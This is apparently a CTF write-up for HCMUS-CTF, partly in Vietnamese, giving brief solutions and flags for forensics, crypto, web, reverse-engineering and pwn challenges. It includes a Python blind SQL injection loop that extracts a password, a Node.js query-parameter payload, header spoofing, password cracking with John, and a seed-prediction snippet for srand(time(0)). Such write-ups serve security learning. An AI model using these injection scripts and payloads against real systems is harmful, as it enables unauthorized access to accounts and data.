# HCMUS-CTF
## Forensics
### Docker Babe
- <code> docker pull pakkunandy/docker-babe </code>
- <code> docker run -t -i pakkunandy/docker-babe bash</code>
- <code> cat flag.txt </code>
- Flag: HCMUS-CTF{Docker_Is_an_essential_tool_You_have_to_learn_FORRRRSURRREEEE}

## Crypto
### Xor
- Xor cipher với key "HCMUS-CTF", ta thấy key = "FIT"
- Xor cipher với key "FIT"
- Flag: HCMUS-CTF{XoR_1s_a_KinD_oF_Crypto}
### The Ripper
- Dùng John với 2 file được cho, ta được username và password
- Flag: HCMUS-CTF{Use_John_the_ripper_to_crack_password_is_fun!!!HAHAHA}

## Web
### Secret Agent
- Thêm header: "User-Agent: eevee" vào request
- Flag: HCMUS-CTF{+he_4g3nt_Izzz_eevoolution0123456}
### Secret Dir
- Tìm được http://159.65.13.76:1338/
- Gửi request đến /flagpassword với header: "Referer: http://159.65.13.76:1338/flagflagflagflag", ta được username và password để vào /flagflagflagflag.
- Flag: HCMUS-CTF{1t_1zzzz_Crucial_t0_kn0W_Headers_and_R0b0tz}
### Blind SQL
- Blind SQL cơ bản
```
  for i in range(0, 50):
	print(i)
	for char in mchar:
		payload = "admin\' and password LIKE BINARY \'" + flag + char + "%"
		data = {'username': payload}
		x = requests.post(url, data)
		if "exists" in x.text:
			flag = flag + char
			break
print(flag)
```
- Flag: HCMUS-CTF{Sh0uld_I_Us3_NoSQL_N3xt_T1m3_0x3f3f3f}

### Funny Express
- Payload: ?query[toString]=0
- Flag: HCMUS-CTF{DidntKn0wN0d3JSW0uld_be_sooo00z_Funny}

## RE
### Patient Revenge Revenge
- Patch file exe để vô hiệu hóa timer :D
- Flag: HCMUS-CTF{d0_y0u_kn0w_ARc_fourrrrrrrrrrrr}
### Z3
- Dùng IDA decompile chương trình, sau đó copy hàm checkme vào đưa cho z3-solver
- Flag: HCMUS-CTF{H4v3_y0u_ev3r_he4rd_0f_z3}
### Lucky mine
- Dùng cnSpy debug chương trình, đặt breakpoint ở hàm Init_Mine_Field(), ta tìm ra được các vị trí không phải bom
- Flag: HCMUS-CTF{C_SHARPez}

## Pwn
### Secret
- Hàm strncmp(a, b, n) chỉ so sánh n ký tự đầu tiên của chuỗi a, b
- Payload: HCMUS-CTF
- Flag: HCMUS-CTF{strncmp_is_so_fun}
### Store
- srand(time(0)) lấy seed là thời gian hiện tại
```
	time_t cur = time(0);
	for(int i = 0; i < 1000000; i++)
	{
		srand(cur - i);
		for(int j = 0; j < 3; j++)
		{	
			if(rand() % 123456 != price[j])
			{
				break;
			}
			if(j == 2)
			{
				printf("Next number %d\n", rand() % 123456);
				exit(0);
			}
		}
	}
```
